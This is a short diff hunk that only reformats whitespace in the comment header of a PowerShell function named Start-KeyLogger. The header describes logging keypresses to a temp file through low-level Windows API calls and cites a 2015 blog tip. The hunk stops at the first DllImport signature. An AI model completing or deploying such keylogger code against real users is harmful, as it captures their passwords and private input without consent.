@@ -1,16 +1,16 @@
 #requires -Version 2
 function Start-KeyLogger($Path = "$env:temp\keylogger.txt") {
     <#
-	.DESCRIPTION
-		By accessing the Windows low-level API functions, a script can constantly
-		monitor the keyboard for keypresses and log these to a file. This effectively produces a keylogger.
+    .DESCRIPTION
+        By accessing the Windows low-level API functions, a script can constantly
+        monitor the keyboard for keypresses and log these to a file. This effectively produces a keylogger.
 
-		Run the function Start-Keylogger to start logging key presses. Once you
-		stop the script by pressing CTRL+C, the collected key presses are displayed
+        Run the function Start-Keylogger to start logging key presses. Once you
+        stop the script by pressing CTRL+C, the collected key presses are displayed
 
-	.NOTES
-		http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
-	#>
+    .NOTES
+        http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
+    #>
     # Signatures for API Calls
     $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
